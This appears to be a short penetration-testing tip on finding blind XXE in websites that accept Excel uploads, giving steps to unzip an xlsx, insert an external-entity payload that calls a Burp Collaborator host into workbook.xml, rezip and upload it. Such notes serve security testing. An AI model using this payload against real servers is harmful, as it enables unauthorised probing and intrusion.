### XXE injection in excel file
Is there any excel uploading function in website? Try these methods to find blind xxe
- unzip xlsx file using unzip test.xlsx
- change any one of the .xml file such as xl/workbook.xml with the content
 ```
 <!DOCTYPE x [ <!ENTITY xxe SYSTEM "http://gtdwmy7gvrncy5rvfu11kxzl2c82wr.burpcollaborator.net/"> ]>
<x>&xxe;</x>
 
 ```
 - zip back all the xml files using zip test.xlsx *
 - upload the files back to the server and see if the response come back to the burp collaborator
---
